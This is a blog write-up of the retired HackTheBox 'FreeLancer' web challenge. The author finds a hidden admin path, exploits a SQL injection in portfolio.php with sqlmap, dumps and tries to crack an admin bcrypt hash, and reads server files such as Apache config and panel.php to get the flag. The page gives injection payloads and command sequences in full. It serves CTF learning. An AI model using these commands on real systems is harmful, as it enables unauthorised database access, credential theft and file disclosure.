<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en-us lang=en-us><head>&lt; <title itemprop=name>FreeLancer :: Sequr (dev)</title>
<script defer language=javascript type=text/javascript src=/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="noodp, noydir"><meta name=googlebot content="noodp, noydir"><link rel=canonical href=https://dev.sequr.be/blog/hackthebox/challenge/hackthebox-freelancer/ itemprop=url><meta name=url content="https://dev.sequr.be/blog/hackthebox/challenge/hackthebox-freelancer/"><link rel=icon href=favicon.ico><meta itemprop=name content="FreeLancer"><meta itemprop=description content="Write-up of the Freelancer web challenge by IhsanSencan on HackTheBox.eu. Can you test how secure my website is? Prove me wrong and capture the flag!"><meta itemprop=datePublished content="2019-11-19T17:13:58+00:00"><meta itemprop=dateModified content="2019-11-19T17:13:58+00:00"><meta itemprop=wordCount content="1016"><meta itemprop=image content="https://dev.sequr.be/img/htb-freelancer.png"><meta itemprop=keywords content="Challenge,HackTheBox.eu,IhsanSencan,Web"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://dev.sequr.be/img/htb-freelancer.png"><meta name=twitter:title content="FreeLancer"><meta name=twitter:description content="Write-up of the Freelancer web challenge by IhsanSencan on HackTheBox.eu. Can you test how secure my website is? Prove me wrong and capture the flag!"><meta property="og:url" content="https://dev.sequr.be/blog/hackthebox/challenge/hackthebox-freelancer/"><meta property="og:site_name" content="Sequr (dev)"><meta property="og:title" content="FreeLancer"><meta property="og:description" content="Write-up of the Freelancer web challenge by IhsanSencan on HackTheBox.eu. Can you test how secure my website is? Prove me wrong and capture the flag!"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2019-11-19T17:13:58+00:00"><meta property="article:modified_time" content="2019-11-19T17:13:58+00:00"><meta property="article:tag" content="Challenge"><meta property="article:tag" content="HackTheBox.eu"><meta property="article:tag" content="IhsanSencan"><meta property="article:tag" content="Web"><meta property="og:image" content="https://dev.sequr.be/img/htb-freelancer.png"><meta name=description content="Write-up of the Freelancer web challenge by IhsanSencan on HackTheBox.eu. Can you test how secure my website is? Prove me wrong and capture the flag!"><meta itemprop=description content="Write-up of the Freelancer web challenge by IhsanSencan on HackTheBox.eu. Can you test how secure my website is? Prove me wrong and capture the flag!"><meta property="og:updated_time" content="2019-11-19T17:13:58Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dev.sequr.be/sitemap.xml><meta name=apple-mobile-web-app-title content="Sequr (dev)"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><link type=text/css rel=stylesheet href=/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css integrity="sha256-lKM5g2+J8NJfMZgMtrBjHaIeIK8Sgwh0fOROBSXrFu8=" crossorigin=anonymous><style>body{--sidebar-bg-color:#202020;--sidebar-img-border-color:#515151;--sidebar-p-color:#909090;--sidebar-h1-color:#FFF;--sidebar-a-color:#FFF;--sidebar-socials-color:#FFF;--text-color:#222;--bkg-color:#FAF9F6;--post-title-color:#303030;--list-color:#5A5A5A;--link-color:#268BD2;--date-color:#515151;--table-border-color:#E5E5E5;--table-stripe-color:#F9F9F9;--code-color:#000;--code-background-color:#E5E5E5;--code-block-color:#FFF;--code-block-background-color:#272822;--moon-sun-color:#FFF;--moon-sun-background-color:#515151}body.dark-theme{--text-color:#EEE;--bkg-color:#121212;--post-title-color:#DBE2E9;--list-color:#9D9D9D;--link-color:#268BD2;--date-color:#9A9A9A;--table-border-color:#515151;--table-stripe-color:#202020;--code-color:#FFF;--code-background-color:#515151;--code-block-color:#FFF;--code-block-background-color:#272822}body{background-color:var(--bkg-color)}</style></head><body><div class=wrapper><aside class=sidebar><div class="container sidebar-sticky"><div class=light-dark align=right><button class=btn-light-dark title="Toggle light/dark mode"><svg class="moon" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M6 .278a.768.768.0 01.08.858 7.208 7.208.0 00-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527.0 1.04-.055 1.533-.16a.787.787.0 01.81.316.733.733.0 01-.031.893A8.349 8.349.0 018.344 16C3.734 16 0 12.286.0 7.71.0 4.266 2.114 1.312 5.124.06A.752.752.0 016 .278z"/></svg><svg class="sun" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 0zm0 13a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 13zm8-5a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2a.5.5.0 01.5.5zM3 8a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2A.5.5.0 013 8zm10.657-5.657a.5.5.0 010 .707l-1.414 1.415a.5.5.0 11-.707-.708l1.414-1.414a.5.5.0 01.707.0zm-9.193 9.193a.5.5.0 010 .707L3.05 13.657a.5.5.0 01-.707-.707l1.414-1.414a.5.5.0 01.707.0zm9.193 2.121a.5.5.0 01-.707.0l-1.414-1.414a.5.5.0 01.707-.707l1.414 1.414a.5.5.0 010 .707zM4.464 4.465a.5.5.0 01-.707.0L2.343 3.05a.5.5.0 11.707-.707l1.414 1.414a.5.5.0 010 .708z"/></svg></button></div><div class=sidebar-about><h1 class=brand><a href=https://dev.sequr.be/><img src=logo.png alt="brand image">
</a><a href=https://dev.sequr.be/><h1>Sequr (dev)</h1></a></h1><p class=lead>Dev version of sequr.be. This site may break at any time.</p></div><nav><ul class=sidebar-nav><li class=heading><a href=/about/>About</a></li><li class=heading>Blog</li><li class=heading><a href=/privacy/>Privacy</a></li></ul></nav><a target=_blank class=social title="RSS Feed" href=/posts/index.xml><svg width="1em" height="1.2em" viewBox="0 0 1280 1280"><g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentcolor"><path d="M2295 11929c-284-12-642-45-707-65-17-5-18-63-18-1039 0-569 4-1036 8-1039 5-3 74 6 153 19 510 86 1168 95 1789 25 1348-153 2602-677 3670-1531 385-308 820-744 1126-1129 842-1060 1362-2313 1514-3650 70-621 61-1279-25-1789-13-79-22-148-19-153 3-4 471-8 1039-8h1035l5 23c51 225 85 942 67 1419-23 605-77 1044-198 1617-294 14e2-927 2734-1823 3846-1043 1295-2364 2259-3909 2854-1158 447-2451 656-3707 6e2z"/><path d="M2255 7845c-269-25-620-81-667-106-17-9-18-55-18-899 0-706 3-890 13-890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207-107 2267-823 2814-1902 166-327 268-637 330-1001 38-227 48-384 42-662-8-348-44-590-126-831-23-66-41-126-41-132 0-10 184-13 890-13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782-59 703-233 1323-545 1945-481 956-1313 1788-2270 2268-620 310-1239 483-1940 542-165 14-669 10-840-5z"/><path d="M2519 3815c-391-66-725-336-868-703-79-201-96-462-45-677 83-344 338-641 666-774 116-47 205-69 330-80 412-39 811 153 1040 5e2 193 292 240 648 128 981-135 403-492 699-914 757-1e2 14-241 12-337-4z"/></g></svg></a><p class=footnote>&copy; 2019
• <a class="p-name u-url" href=https://sequr.be>DezeStijn</a>
• &lt;a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0&lt;/a></p></div></aside><main class="content container"><div class=post><div class=info><h1 class=post-title><a href=https://dev.sequr.be/blog/hackthebox/challenge/hackthebox-freelancer/>FreeLancer</a></h1><div class=headline><div><span>DezeStijn - </span><time datetime=2019-11-19T17:13:58Z class=post-date>November 19, 2019
</time><span>- </span><span class=reading-time><span>5 mins read</span></span></div><ul class=tags><li class=tag-Challenge><a href=https://dev.sequr.be/tags/challenge>Challenge</a></li><li class=tag-HackTheBox.eu><a href=https://dev.sequr.be/tags/hackthebox.eu>HackTheBox.eu</a></li><li class=tag-IhsanSencan><a href=https://dev.sequr.be/tags/ihsansencan>IhsanSencan</a></li><li class=tag-Web><a href=https://dev.sequr.be/tags/web>Web</a></li></ul></div></div><p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p><h2 id=challenge-info>Challenge info</h2><p>FreeLancer [by <a href=https://www.hackthebox.eu/home/users/profile/100992%22 target=_blank>IhsanSencan</a>]<br>Can you test how secure my website is? Prove me wrong and capture the flag!</p><h2 id=the-challenge>The challenge</h2><p>We start by launching the instance of the web application. This spawns a docker instance which is accessible without VPN.</p><p>The web applications looks like a typical portfolio website of a freelancer.<br>The menu items at the top make the browser scroll to the relevant section.</p><figure class=center><img src=/img/htb-freelancer-img1.png><figcaption class=center>Main page</figcaption></figure><h3 id=looking-at-the-contact-form>Looking at the contact form</h3><p>The contact form at the bottom looks like an interesting first target, as this handles user input, which often might lead to some form of injection or scripting.</p><p>Trying to send something in the contact form results in an error message about the server not responding. The <em>Name</em> value is reflected but — even if exploitable — this would only lead to a Reflected XSS.</p><p><figure class=center><img src=/img/htb-freelancer-img2.png alt="Screenshot of the contact form"><figcaption class=center>Testing XSS in the Name field</figcaption></figure><br><figure class=center><img src=/img/htb-freelancer-img3.png><figcaption class=center>Name is reflected, but appears to be sanitized</figcaption></figure></p><h3 id=busting-directories>Busting directories</h3><p>Let&rsquo;s run dirbuster in the background to see if we can find anything interesting hidden elsewhere on this website.</p><p>Running dirb twice, once without extensions and once with the .php extension results in the following paths to be discovered.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>/img/
</span></span><span style=display:flex><span>/css/
</span></span><span style=display:flex><span>/js/
</span></span><span style=display:flex><span>/mail/
</span></span><span style=display:flex><span>/vendor/
</span></span><span style=display:flex><span>/administrat/
</span></span><span style=display:flex><span>/administrat/index.php
</span></span><span style=display:flex><span>/administrat/logout.php
</span></span><span style=display:flex><span>/administrat/panel.php
</span></span><span style=display:flex><span>/administrat/include/
</span></span><span style=display:flex><span>/portfolio.php
</span></span></code></pre></div><h3 id=admin-portal>Admin portal</h3><p>The <code>/administrat/</code> path definitely looks interesting. The name seems to reveal that this is an admin portal.</p><p>The admin portal is protected with a login form. Testing this form quickly reveals that it might be leaking information on the existance of the username, which would allow someone to bruteforce usernames based on the error message.</p><figure class=center><img src=/img/htb-freelancer-img4.png><figcaption class=center>Administrat login form</figcaption></figure><p>However, running Burp with the included username list and the Honeypot-captures from <a href=https://github.com/danielmiessler/SecLists/tree/master/Usernames/Honeypot-Captures%22 target=_blank>SecList</a> doesn&rsquo;t seem to recover a valid username.</p><h3 id=look-at-the-source>Look at the source</h3><p>Let&rsquo;s revert back to the basics of web app pentesting and have a look at the source of the index page.</p><p>Looking closely at the section near the images, it appears that there is or was a plan to include links to various portfolio items. These links have been commented out.</p><figure class=center><img src=/img/htb-freelancer-img5.png><figcaption class=center>index source code showing portfolio.php URLs</figcaption></figure><p>Whenever I see IDs in a URL, I think about injection. So let&rsquo;s launch SQLmap and try to see if there&rsquo;s an injection point here.<br>And we find that this param is indeed vulnerable and that the back-end DBMS is MySQL.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -u http://docker.hackthebox.eu:31749/portfolio.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -p id
</span></span><span style=display:flex><span><span style=color:#75715e># [...]</span>
</span></span><span style=display:flex><span>GET parameter <span style=color:#e6db74>&#39;id&#39;</span> is vulnerable. Do you want to keep testing the others <span style=color:#f92672>(</span><span style=color:#66d9ef>if</span> any<span style=color:#f92672>)</span>? <span style=color:#f92672>[</span>y/N<span style=color:#f92672>]</span> n
</span></span><span style=display:flex><span>sqlmap identified the following injection point<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> with a total of <span style=color:#ae81ff>61</span> HTTP<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> requests:
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>Parameter: id <span style=color:#f92672>(</span>GET<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Type: boolean-based blind
</span></span><span style=display:flex><span>    Title: AND boolean-based blind - WHERE or HAVING clause
</span></span><span style=display:flex><span>    Payload: id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND 2315<span style=color:#f92672>=</span><span style=color:#ae81ff>2315</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Type: time-based blind
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0.12 AND time-based blind <span style=color:#f92672>(</span>query SLEEP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND <span style=color:#f92672>(</span>SELECT <span style=color:#ae81ff>3863</span> FROM <span style=color:#f92672>(</span>SELECT<span style=color:#f92672>(</span>SLEEP<span style=color:#f92672>(</span>5<span style=color:#f92672>)))</span>ScHp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Type: UNION query
</span></span><span style=display:flex><span>    Title: Generic UNION query <span style=color:#f92672>(</span>NULL<span style=color:#f92672>)</span> - <span style=color:#ae81ff>3</span> columns
</span></span><span style=display:flex><span>    Payload: id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> UNION ALL SELECT NULL,NULL,CONCAT<span style=color:#f92672>(</span>0x7171767071,0x73666f586c5448666e5862584a6e76787750764250436273565544486e544f6b4454776d6f454e54,0x716a6b7071<span style=color:#f92672>)</span>-- cIwp
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>17:50:49<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> the back-end DBMS is MySQL
</span></span><span style=display:flex><span>web server operating system: Linux Ubuntu
</span></span><span style=display:flex><span>web application technology: Apache 2.4.29
</span></span><span style=display:flex><span>back-end DBMS: MySQL &gt;<span style=color:#f92672>=</span> 5.0.12
</span></span></code></pre></div><p>Using some further reconnaissance, we discover that there&rsquo;s a <code>freelancer</code> database, containing a <code>portfolio</code> and <code>safeadmin</code> tables. The first one containing some data for the portfolio pages and the latter containing a user credential.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -u http://docker.hackthebox.eu:31749/portfolio.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -p id --dbs
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>17:51:55<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching database names                                                                                                                                                     
</span></span><span style=display:flex><span>available databases <span style=color:#f92672>[</span>4<span style=color:#f92672>]</span>:                                                                                                                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> freelancer                                                                                                                                                                                
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> information_schema                                                                                                                                                                        
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> mysql                                                                                                                                                                                     
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> performance_schema
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sqlmap -u http://docker.hackthebox.eu:31749/portfolio.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -p id -D freelancer --tables
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>17:52:39<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching tables <span style=color:#66d9ef>for</span> database: <span style=color:#e6db74>&#39;freelancer&#39;</span>
</span></span><span style=display:flex><span>Database: freelancer
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> tables<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+-----------+
</span></span><span style=display:flex><span>| portfolio |
</span></span><span style=display:flex><span>| safeadmin |
</span></span><span style=display:flex><span>+-----------+
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sqlmap -u http://docker.hackthebox.eu:31749/portfolio.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -p id -D freelancer -T safeadmin --columns
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>17:54:51<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching columns <span style=color:#66d9ef>for</span> table <span style=color:#e6db74>&#39;safeadmin&#39;</span> in database <span style=color:#e6db74>&#39;freelancer&#39;</span>
</span></span><span style=display:flex><span>Database: freelancer
</span></span><span style=display:flex><span>Table: safeadmin
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> columns<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+------------+--------------+
</span></span><span style=display:flex><span>| Column     | Type         |
</span></span><span style=display:flex><span>+------------+--------------+
</span></span><span style=display:flex><span>| created_at | datetime     |
</span></span><span style=display:flex><span>| id         | int<span style=color:#f92672>(</span>11<span style=color:#f92672>)</span>      |
</span></span><span style=display:flex><span>| password   | varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>| username   | varchar<span style=color:#f92672>(</span>50<span style=color:#f92672>)</span>  |
</span></span><span style=display:flex><span>+------------+--------------+
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sqlmap -u http://docker.hackthebox.eu:31749/portfolio.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -p id -D freelancer -T safeadmin -C username,password --dump
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>17:55:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching entries of column<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> <span style=color:#e6db74>&#39;password, username&#39;</span> <span style=color:#66d9ef>for</span> table <span style=color:#e6db74>&#39;safeadmin&#39;</span> in database <span style=color:#e6db74>&#39;freelancer&#39;</span>
</span></span><span style=display:flex><span>Database: freelancer
</span></span><span style=display:flex><span>Table: safeadmin
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>1</span> entry<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+----------+--------------------------------------------------------------+
</span></span><span style=display:flex><span>| username | password                                                     |
</span></span><span style=display:flex><span>+----------+--------------------------------------------------------------+
</span></span><span style=display:flex><span>| safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K |
</span></span><span style=display:flex><span>+----------+--------------------------------------------------------------+
</span></span></code></pre></div><h3 id=cracking>Cracking</h3><p>Let&rsquo;s attempt to crack this hash.</p><p>Let&rsquo;s first run <code>hashid</code> to figure out which type of hash this is.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ hashid
</span></span><span style=display:flex><span>$2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K
</span></span><span style=display:flex><span>Analyzing <span style=color:#e6db74>&#39;$2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Blowfish<span style=color:#f92672>(</span>OpenBSD<span style=color:#f92672>)</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Woltlab Burning Board 4.x 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> bcrypt
</span></span></code></pre></div><p>Since this is appears to be a bcrypt(Blowfish) hash, we run hashcat with mode 3200.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ hashcat -a <span style=color:#ae81ff>0</span> -m <span style=color:#ae81ff>3200</span> <span style=color:#e6db74>&#39;$2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K&#39;</span> --force /usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><p>Get ready to wait a looooong time on the results of this.</p><h3 id=back-to-sql>Back to SQL</h3><p>Since we have a working SQL injection, why not try to exploit this further?</p><p>My first attempts at using SQLmaps&rsquo;s <code>--os-cmd</code>, <code>--os-pwn</code> and <code>--priv-esc</code> failed, as did my attempt at adding a new user entry via <code>--sql-shell</code>.</p><p>However, there was one command that did eventually led me to success: <code>--file-read</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -u http://docker.hackthebox.eu:31749/portfolio.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -p id --file-read /etc/apache2/sites-enabled/000-default.conf
</span></span><span style=display:flex><span><span style=color:#75715e># [...]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>18:04:52<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching file: <span style=color:#e6db74>&#39;/etc/apache2/sites-enabled/000-default.conf&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>do</span> you want confirmation that the remote file <span style=color:#e6db74>&#39;/etc/apache2/sites-enabled/000-default.conf&#39;</span> has been successfully downloaded from the back-end DBMS file system? <span style=color:#f92672>[</span>Y/n<span style=color:#f92672>]</span> n
</span></span><span style=display:flex><span>files saved to <span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> /home/user/.sqlmap/output/docker.hackthebox.eu/files/_etc_apache2_sites-enabled_000-default.conf
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ cat /home/user/.sqlmap/output/docker.hackthebox.eu/files/_etc_apache2_sites-enabled_000-default.conf
</span></span><span style=display:flex><span><span style=color:#75715e># [...]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Looks like the website&#39;s files are located here</span>
</span></span><span style=display:flex><span>DocumentRoot /var/www/html
</span></span><span style=display:flex><span><span style=color:#75715e># [...]</span>
</span></span></code></pre></div><h2 id=getting-the-flag>Getting the flag</h2><p>We now know that we can read files on the filesystem, that the root of the web application is at <code>/var/www/html</code> and that we probably want to see the contents of the file at <code>docker.hackthebox.eu:31749/administrat/panel.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -u http://docker.hackthebox.eu:31749/portfolio.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -p id --file-read<span style=color:#f92672>=</span>/var/www/html/administrat/panel.php
</span></span><span style=display:flex><span><span style=color:#75715e># [...]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>18:08:08<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching file: <span style=color:#e6db74>&#39;/var/www/html/administrat/panel.php&#39;</span>
</span></span><span style=display:flex><span>n
</span></span><span style=display:flex><span>files saved to <span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> /home/user/.sqlmap/output/docker.hackthebox.eu/files/_var_www_html_administrat_panel.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ cat /home/user/.sqlmap/output/docker.hackthebox.eu/files/_var_www_html_administrat_panel.php
</span></span><span style=display:flex><span><span style=color:#75715e># [...]</span>
</span></span><span style=display:flex><span>&lt;body&gt;
</span></span><span style=display:flex><span>    &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;page-header&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;h1&gt;Hi, &lt;b&gt;&lt;?php echo htmlspecialchars<span style=color:#f92672>(</span>$_SESSION<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;username&#34;</span><span style=color:#f92672>])</span>; ?&gt;&lt;/b&gt;. Welcome to our site.&lt;/h1&gt;&lt;b&gt;<span style=color:#f92672>[</span>Logout<span style=color:#f92672>](</span>logout.php<span style=color:#f92672>)</span>&lt;/b&gt;
</span></span><span style=display:flex><span>&lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span style=display:flex><span>        &lt;h1&gt;HTB<span style=color:#f92672>{</span>s4ff_***_3<span style=color:#f92672>}</span>&lt;/h1&gt;
</span></span><span style=display:flex><span>    &lt;/div&gt;
</span></span><span style=display:flex><span>&lt;/body&gt;
</span></span></code></pre></div><p>This was a very nice challenge that gave me much more insight into the capabilities of a tool like SQLmap.</p><p>It might be possible that the initial road to success was a different one, but I&rsquo;m very pleased with the path I found to finish this challenge.</p><hr><div class=footer><a class=previous-post href="https://dev.sequr.be/blog/hackthebox/machine/hackthebox-networked/?ref=footer"><span style=font-weight:700>« Previous</span><br>Networked</a><div class=next-post><a href="https://dev.sequr.be/blog/hackthebox/challenge/hackthebox-m0rsarchive/?ref=footer"><span style=font-weight:700>Next »</span><br>M0rsarchive</a></div></div></div></main><div class=article-toc><div class=toc-wrapper><h4 id=contents></h4><nav id=TableOfContents><ul><li><a href=#challenge-info>Challenge info</a></li><li><a href=#the-challenge>The challenge</a><ul><li><a href=#looking-at-the-contact-form>Looking at the contact form</a></li><li><a href=#busting-directories>Busting directories</a></li><li><a href=#admin-portal>Admin portal</a></li><li><a href=#look-at-the-source>Look at the source</a></li><li><a href=#cracking>Cracking</a></li><li><a href=#back-to-sql>Back to SQL</a></li></ul></li><li><a href=#getting-the-flag>Getting the flag</a></li></ul></nav></div></div></div></body></html>